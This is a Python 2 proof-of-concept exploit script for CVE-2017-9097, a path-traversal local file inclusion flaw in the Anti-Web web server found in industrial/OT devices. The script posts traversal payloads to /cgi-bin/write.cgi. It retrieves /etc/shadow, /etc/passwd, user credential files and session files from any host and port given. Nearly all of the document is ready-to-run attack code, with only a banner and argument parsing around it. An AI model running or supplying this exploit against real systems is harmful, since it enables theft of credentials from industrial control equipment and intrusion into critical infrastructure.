# -*- coding: utf-8 -*- 
import requests
import argparse
import sys

banner = '''

		|=--------------------------------------------------------------------=|
		|=--------=[ Server: "Anti-Web 3.0.x < 3.8.x", LFI Exploit  ]=--------=|
		|=--------------------------=[ 15 may 2017 ]=-------------------------=|
		|=-------------------------=[  Researcher:  ]=------------------------=|
		|=---------------=[ Bertin Jose && Fernandez Ezequiel ]=--------------=|
		|=--------------------------------------------------------------------=|
'''

details = ''' 
 # Exploit:\tApps industrial / OT, over server Anti-web:  Vuln to LFI Exploit
 # CVE:\t\tCVE-2017-9097
 # Date: 	15/05/2017
 # Vendor: 	Multiples vendors
 # Category: \tIndustrial OT webapps

 # Exploit by: Bertin Jose ( @bertinjoseb ) && Fernandez Ezequiel ( @capitan_alfa )
 # PoC: https://www.youtube.com/watch?v=HdkZA1DO08Y
'''

parser = argparse.ArgumentParser(prog='anti-web.py',
								description=' [+] CVE: CVE-2017-9097', 
								epilog='[+] Demo: anti-web.py --host 192.168.1.100 --port 80',
								version="1")

parser.add_argument('--host', 	dest="HOST", 	help='host',required=True)
parser.add_argument('--port', 	dest="PORT", 	help='Set port (default = 80)', default="80", required=False)
parser.add_argument('--file', 	dest="LFI", 	help='Test LFI',  	default=0, 	required=False)
parser.add_argument('-ck', 		dest="COOKIE",	help='Set Cookie',  default=0, 	required=False)


args 	= parser.parse_args()

HST   	= args.HOST
PRT 	= args.PORT
xFILE 	= args.LFI       #  /etc/config/tsmgr.xml
cookie 	= args.COOKIE

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

print Colors.GREEN+banner
print Colors.BLUE+details



print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+"http://"+Colors.GREEN+(HST)+Colors.RED+":"+Colors.BLUE+(PRT)+Colors.ORANGE+"/"

print Colors.GREEN+" [*] POST:\t"+Colors.BLUE+"page=/&template=<"+Colors.RED+" LFI "+Colors.BLUE+">"

xFiles = [
		"/etc/passwd",
		"/etc/shadow",
		"/etc/config/system.conf",
		"/etc/version",
		"/etc/config/crontab",
		"/home/config/users.cfg",
		"/var/sessions.conf"
]

host  	=  "http://"+HST+":"+PRT+"/cgi-bin/write.cgi"

def makeReq(filePost, hst,prt,xCookie):
	headers = {}
	lenLFI 	= int(len(filePost))
	ContLen = str(37+lenLFI)

	headers["Host"] 			=  hst
	headers["User-Agent"]		= "Mozilla/5.0 (X11; Linux x86_64; rv:43.0)"
	headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
	headers["Content-Length"]	=  ContLen
	headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
	headers["Referer"] 			=  host
	headers["Connection"] 		= "close"
	headers["Content-Type"] 	= "application/x-www-form-urlencoded"

	if cookie:
		headers["Cookie"]			= "ID="+xCookie

	return headers


print Colors.GREEN+"\n |=--------------------------=[  SIMPLE LFI POCs ]=-------------------------=|\n" +Colors.DEFAULT

def checkLFI(pathLFI):
		#headers = {}
		thePostX = "page=/&template=../../../../../.."+str(pathLFI)

		hdrX = makeReq(thePostX,HST,PRT,cookie)
		try:
			rX = requests.post(host, data=thePostX,headers=hdrX,timeout=10.000)
		except Exception,e:
			#print e
			print Colors.RED+" [+] Timed out\n"+Colors.DEFAULT

			exit()

		print Colors.GREEN+"\r\n [+] "+pathLFI
		outputTEXT = rX.text
		
		if  outputTEXT.find("<script>") > 1:
			failFile = Colors.RED+' Path not found'+Colors.DEFAULT
			return failFile
		else:
			return outputTEXT

try:
	if xFILE:
		xpth = checkLFI(xFILE)
		print Colors.ORANGE+(xpth)+Colors.DEFAULT

	else:
		for xPaths in xFiles:
			xpth = checkLFI(xPaths)
			print Colors.ORANGE+(xpth)+Colors.DEFAULT

except KeyboardInterrupt:
	print Colors.RED+'\nInterrupted\n\n'+Colors.DEFAULT
	exit(0)


print "\n"